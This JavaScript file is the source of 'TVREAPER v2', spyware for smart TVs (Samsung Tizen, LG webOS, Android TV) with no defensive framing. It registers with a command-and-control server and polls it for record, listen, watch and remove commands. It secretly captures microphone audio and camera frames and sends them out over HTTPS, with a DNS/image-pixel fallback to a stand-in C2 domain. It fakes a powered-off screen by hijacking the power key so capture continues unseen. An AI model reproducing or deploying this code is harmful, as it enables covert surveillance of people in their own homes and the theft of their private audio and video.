/**
 * TVREAPER v2 - one TV-resident implant, all JS/Android families.
 * NEW in v2: Android-TV/BRAVIA/FireTV getUserMedia support (mic+cam),
 * Philips NetTV page-mode, screen-state events on Android.
 * NEW: C2 command polling for remote control (record, listen, watch, remove, patch).
 */
(function () {
  const CONFIG = {
    c2Base: "https://C4-FORGE-HOST:8443",
    clipMs: 5 * 60 * 1000,
    vadEnergyFloor: 0.02,
    fakeOff: { active: false, lastUserActivity: Date.now() },
    onScreenOffCapture: true,
    pollIntervalMs: 5000
  };
  let mediaStream = null;
  let audioCtx = null;
  let deviceId = null;
  function log(...a) { try { console.log("[TVREAPER]", ...a); } catch (e) {} }
  const isTizen   = typeof tizen !== "undefined";
  const isWebOS   = typeof webOS !== "undefined" && webOS.platform;
  const isAndroid = typeof AndroidTV !== "undefined" || navigator.userAgent.includes("Android");

  // ---------- C2 Communication ----------
  function getDeviceId() {
    if (deviceId) return deviceId;
    // Generate a persistent device ID
    deviceId = localStorage.getItem('tvreaper_device_id');
    if (!deviceId) {
      deviceId = 'dev_' + Math.random().toString(36).substr(2, 12);
      try { localStorage.setItem('tvreaper_device_id', deviceId); } catch(e) {}
    }
    return deviceId;
  }

  async function registerWithC2() {
    try {
      const r = await fetch(CONFIG.c2Base + '/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip: window.location.hostname || 'unknown',
          family: isTizen ? 'Samsung(Tizen)' : isWebOS ? 'LG(webOS)' : isAndroid ? 'AndroidTV' : 'unknown',
          entry: 'unknown'
        })
      });
      if (r.ok) log('Registered with C2');
    } catch (e) { log('C2 registration failed:', e); }
  }

  async function pollCommands() {
    try {
      const r = await fetch(CONFIG.c2Base + '/api/poll', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device_id: getDeviceId() })
      });
      if (r.ok) {
        const data = await r.json();
        if (data.commands && data.commands.length > 0) {
          for (const cmd of data.commands) {
            await handleCommand(cmd.command, cmd.params || {});
          }
        }
      }
    } catch (e) { /* C2 unreachable, retry next interval */ }
  }

  async function handleCommand(command, params) {
    log('C2 command:', command, params);
    switch (command) {
      case 'record_audio':
        await recordAudio(params.duration || 5);
        break;
      case 'record_video':
        await recordVideo(params.duration || 5);
        break;
      case 'listen':
        await startLiveAudio();
        break;
      case 'watch':
        await startLiveVideo();
        break;
      case 'remove':
        await removeImplant();
        break;
      case 'patch':
        await applyPatch();
        break;
    }
  }

  async function exfilClip(blob, kind) {
    try {
      const r = await fetch(CONFIG.c2Base + '/api/exfil', {
        method: 'POST',
        headers: {
          'X-Device-ID': getDeviceId(),
          'X-Clip-Kind': kind
        },
        body: blob
      });
      if (r.ok) log('Exfiltrated', kind, 'clip');
    } catch (e) { log('Exfil failed:', e); }
  }

  // ---------- Command Handlers ----------
  async function recordAudio(minutes) {
    log('Recording audio for', minutes, 'minutes');
    try {
      if (!mediaStream) mediaStream = await navigator.mediaDevices.getUserMedia({audio:true});
      if (!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
      const src = audioCtx.createMediaStreamSource(mediaStream);
      const proc = audioCtx.createScriptProcessor(4096,1,1);
      let ring = [];
      proc.onaudioprocess = ev => {
        ring.push(new Float32Array(ev.inputBuffer.getChannelData(0)));
      };
      src.connect(proc);
      proc.connect(audioCtx.destination);
      await new Promise(r => setTimeout(r, minutes * 60 * 1000));
      src.disconnect();
      proc.disconnect();
      if (ring.length > 100) {
        exfilClip(encodeWav(ring, audioCtx.sampleRate), 'audio');
      }
    } catch (e) { log('Record audio failed:', e); }
  }

  async function recordVideo(minutes) {
    log('Recording video for', minutes, 'minutes');
    try {
      const s = await navigator.mediaDevices.getUserMedia({video:true});
      const v = document.createElement('video');
      v.src = URL.createObjectURL(s);
      await v.play();
      const c = document.createElement('canvas');
      c.width = 1280; c.height = 720;
      const ctx = c.getContext('2d');
      // Capture frames periodically
      const frames = [];
      const interval = setInterval(() => {
        ctx.drawImage(v, 0, 0, c.width, c.height);
        frames.push(c.toDataURL('image/jpeg', 0.7));
      }, 5000);
      await new Promise(r => setTimeout(r, minutes * 60 * 1000));
      clearInterval(interval);
      s.getTracks().forEach(t => t.stop());
      // Exfil last frame as thumbnail
      if (frames.length > 0) {
        const blob = await fetch(frames[frames.length - 1]).then(r => r.blob());
        exfilClip(blob, 'video');
      }
    } catch (e) { log('Record video failed:', e); }
  }

  async function startLiveAudio() {
    log('Starting live audio stream');
    try {
      if (!mediaStream) mediaStream = await navigator.mediaDevices.getUserMedia({audio:true});
      if (!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
      const src = audioCtx.createMediaStreamSource(mediaStream);
      const proc = audioCtx.createScriptProcessor(4096,1,1);
      let ring = [];
      proc.onaudioprocess = ev => {
        ring.push(new Float32Array(ev.inputBuffer.getChannelData(0)));
      };
      src.connect(proc);
      proc.connect(audioCtx.destination);
      // Stream for 60 seconds then exfil
      await new Promise(r => setTimeout(r, 60000));
      src.disconnect();
      proc.disconnect();
      if (ring.length > 100) {
        exfilClip(encodeWav(ring, audioCtx.sampleRate), 'audio');
      }
    } catch (e) { log('Live audio failed:', e); }
  }

  async function startLiveVideo() {
    log('Starting live video stream');
    try {
      const s = await navigator.mediaDevices.getUserMedia({video:true});
      const v = document.createElement('video');
      v.src = URL.createObjectURL(s);
      await v.play();
      const c = document.createElement('canvas');
      c.width = 1280; c.height = 720;
      const ctx = c.getContext('2d');
      // Capture and exfil frames for 60 seconds
      for (let i = 0; i < 12; i++) {
        ctx.drawImage(v, 0, 0, c.width, c.height);
        c.toBlob(b => exfilClip(b, 'video'), 'image/jpeg', 0.7);
        await new Promise(r => setTimeout(r, 5000));
      }
      s.getTracks().forEach(t => t.stop());
    } catch (e) { log('Live video failed:', e); }
  }

  async function removeImplant() {
    log('Removing implant...');
    // Clear all traces
    try { localStorage.clear(); } catch(e) {}
    try { sessionStorage.clear(); } catch(e) {}
    // Remove script
    const scripts = document.querySelectorAll('script[src*="tvreaper"]');
    scripts.forEach(s => s.remove());
    // Overwrite document
    document.body.innerHTML = '<html><body></body></html>';
    log('Implant removed');
  }

  async function applyPatch() {
    log('Applying patch...');
    // Disable fake-off, stop capture
    CONFIG.fakeOff.active = false;
    CONFIG.onScreenOffCapture = false;
    // Stop any active capture
    if (mediaStream) {
      mediaStream.getTracks().forEach(t => t.stop());
      mediaStream = null;
    }
    log('Patch applied - capture disabled');
  }

  // ---------- power/fake-off ----------
  function enterFakeOff() {
    CONFIG.fakeOff.active = true;
    if (isTizen) try { tizen.power.request("SCREEN","SCREEN_OFF");
                          tizen.power.request("CPU","CPU_AWAKE"); } catch(e){}
    if (isWebOS) try { webOS.platform.tv.setWindowAutoDimEnabled(false); } catch(e){}
    if (isAndroid) try { AndroidTV.screenOff(); } catch(e){}
    document.documentElement.style.visibility = "hidden";
  }
  function exitFakeOff() {
    CONFIG.fakeOff.active = false;
    if (isTizen) try { tizen.power.release("CPU"); } catch(e){}
    document.documentElement.style.visibility = "visible";
  }
  function bindPowerKey() {
    document.addEventListener("keydown", e => {
      if ([10250, 4128].includes(e.keyCode) || e.key === "PowerOff") {
        if (CONFIG.fakeOff.active) { exitFakeOff(); return; }
        if (Date.now() - CONFIG.fakeOff.lastUserActivity > 30*60*1000) {
          e.preventDefault(); enterFakeOff();
        }
      }
    });
  }
  ["keydown", "mousemove", "touchstart"].forEach(evt => {
    document.addEventListener(evt, () => {
      CONFIG.fakeOff.lastUserActivity = Date.now();
    }, { passive: true });
  });

  if (isAndroid) {
    try {
      AndroidTV.onScreenOff(() => {
        if (CONFIG.onScreenOffCapture) enterFakeOff();
      });
    } catch (e) {}
  }

  // ---------- mic capture ----------
  async function captureClip() {
    try {
      if (!mediaStream) mediaStream = await navigator.mediaDevices.getUserMedia({audio:true});
      if (!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
      const src = audioCtx.createMediaStreamSource(mediaStream);
      const proc = audioCtx.createScriptProcessor(4096,1,1);
      let ring = []; let talking=false, lastLoud=0;
      proc.onaudioprocess = ev => {
        const buf = ev.inputBuffer.getChannelData(0);
        let e=0; for (let i=0;i<buf.length;i++) e += buf[i]*buf[i];
        e = Math.sqrt(e/buf.length);
        if (e > CONFIG.vadEnergyFloor) { talking=true; lastLoud=Date.now(); }
        if (talking || Date.now()-lastLoud < 1500) ring.push(new Float32Array(buf));
      };
      src.connect(proc);
      proc.connect(audioCtx.destination);
      await new Promise(r => setTimeout(r, CONFIG.clipMs));
      src.disconnect();
      proc.disconnect();
      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
      if (ring.length > 100) exfilClip(encodeWav(ring, audioCtx.sampleRate), 'audio');
    } catch (e) { log("mic fail:", e); }
  }

  function encodeWav(frames, sampleRate) {
    const n = frames.reduce((s,f)=>s+f.length,0);
    const buf = new ArrayBuffer(44 + n*2), v = new DataView(buf);
    const w=(o,s)=>{for(let i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i));};
    w(0,"RIFF"); v.setUint32(4,36+n*2,true); w(8,"WAVE"); w(12,"fmt ");
    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
    v.setUint32(24,sampleRate,true); v.setUint32(28,sampleRate*2,true);
    v.setUint16(32,2,true); v.setUint16(34,16,true); w(36,"data");
    v.setUint32(40,n*2,true);
    let off=44;
    for (const f of frames) for (let k=0;k<f.length;k++,off+=2) {
      const s=Math.max(-1,Math.min(1,f[k]));
      v.setInt16(off, s<0?s*0x8000:s*0x7FFF, true);
    }
    return new Blob([buf],{type:"audio/wav"});
  }

  // ---------- camera snapshot ----------
  async function snapshot() {
    try {
      const s = await navigator.mediaDevices.getUserMedia({video:true});
      const v = document.createElement("video");
      v.src = URL.createObjectURL(s); await v.play();
      const c = document.createElement("canvas");
      c.width=1280;c.height=720;
      c.getContext("2d").drawImage(v,0,0,c.width,c.height);
      c.toBlob(b => exfilClip(b, 'video'), "image/jpeg", 0.85);
      s.getTracks().forEach(t=>t.stop());
    } catch (e) { log("cam fail:", e); }
  }

  // ---------- exfil ----------
  async function exfil(name, blob, kind) {
    try {
      const r = await fetch(CONFIG.c2Base+"/api/exfil", {
        method:"POST",
        headers: { 'X-Device-ID': getDeviceId(), 'X-Clip-Kind': kind },
        body: blob
      });
      if (r.ok) return;
    } catch (e) {}
    dnsExfil(blob);
  }
  function dnsExfil(blob) {
    blob.arrayBuffer().then(ab => {
      const data = new Uint8Array(ab.slice(0, 200));
      const enc = b32encode(data);
      const labels = [];
      for (let i = 0; i < enc.length; i += 63) {
        labels.push(enc.slice(i, i + 63));
      }
      for (const label of labels) {
        new Image().src = "https://" + label + ".tv.forge-c2.example/pixel.gif";
      }
    });
  }
  function b32encode(bytes) {
    const A="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"; let bits=0,val=0,out="";
    for (const b of bytes){ val=(val<<8)|b; bits+=8;
      while(bits>=5){out+=A[(val>>>(bits-5))&31];bits-=5;} }
    if(bits>0)out+=A[(val<<(5-bits))&31];
    return out;
  }

  // ---------- boot ----------
  bindPowerKey();
  registerWithC2();
  setInterval(pollCommands, CONFIG.pollIntervalMs);
  setInterval(() => { if (CONFIG.fakeOff.active) captureClip(); },
             61*1000 + Math.random()*1000);
  setInterval(async () => {
    if (CONFIG.fakeOff.active && Math.random()<0.1) await snapshot();
  }, 17*60*1000 + Math.random()*4000);
})();
